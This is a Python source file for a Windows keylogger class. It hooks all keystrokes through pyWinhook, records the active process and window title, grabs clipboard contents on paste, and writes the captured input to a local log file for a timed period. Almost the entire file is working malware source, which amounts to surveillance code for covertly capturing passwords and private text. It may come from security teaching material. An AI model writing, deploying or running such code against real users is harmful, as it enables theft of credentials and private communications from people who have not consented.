from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60

class KeyLogger:
    def __init__(self):
        self.current_window = None

    # Get the active window
    def get_current_process(self):
        # Gets a handle to the active window on the user's desktop
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        # Pass handle to get the PID of the process
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable = create_string_buffer(512)
        # Open the process using the handle created
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        window_title = create_string_buffer(512)
        # Get the full text of the window name
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: Window name unknown')

        print("\n", process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def myKeystroke(self, event):
        with open('log.txt', 'w') as f:
            # check if the window has changed
            if event.WindowName != self.current_window:
                self.get_current_process()
            # Look at the new keystroke - if in ASCII printable range
            if 32 < event.Ascii < 127:
                # Print it
                print(chr(event.Ascii), end='')
                f.write(chr(event.Ascii))
            else:
                # If its a paste
                if event.Key == 'V':
                    win32clipboard.OpenClipboard()
                    value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    print(f'[PASTE] - {value}')
                    f.write(f'[PASTE] - {value}')
                # Non standard key (SHIFT ALT ENTER etc)
                else:
                    print(f'{event.Key}')
                    f.write((f'{event.Key}'))
            return True

def run():
    save_stdout = sys.stdout
    # sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    # Bind a key down to the myKeystroke() function
    hm.KeyDown = kl.myKeystroke
    # Tell the manager to hook all keystrokes until the timeout
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

if __name__ == "__main__":
    print(run())
    print('Done.')
